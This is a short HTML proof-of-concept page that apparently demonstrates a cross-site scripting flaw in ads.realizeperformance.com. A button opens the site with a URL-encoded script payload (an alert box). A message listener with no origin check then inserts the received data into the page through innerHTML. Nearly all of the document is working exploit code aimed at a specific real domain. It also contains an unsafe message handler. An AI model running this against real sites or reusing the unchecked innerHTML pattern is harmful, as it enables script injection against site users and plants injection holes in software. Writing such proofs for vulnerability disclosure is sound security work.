<!DOCTYPE html>
<html>
  <head>
    <title>PostMessage XSS PoC</title>
  </head>
  <body>
    <h2>PoC: RealizePerformance PostMessage XSS</h2>
    <button onclick="launch()">Run Exploit</button>

    <div id="output"></div>

    <script>
      function launch() {
        const payloadUrl = "https://ads.realizeperformance.com/?x=%3Cscript%3Ealert('XSS')%3C/script%3E";
        const child = window.open(payloadUrl, "targetWindow", "width=600,height=400");

        window.addEventListener("message", function(event) {
          if (event.data && event.data.value) {
            document.getElementById("output").innerHTML =
              "<p><strong>Injected:</strong></p><div>" + event.data.value + "</div>";
          }
        });
      }
    </script>
  </body>
</html>
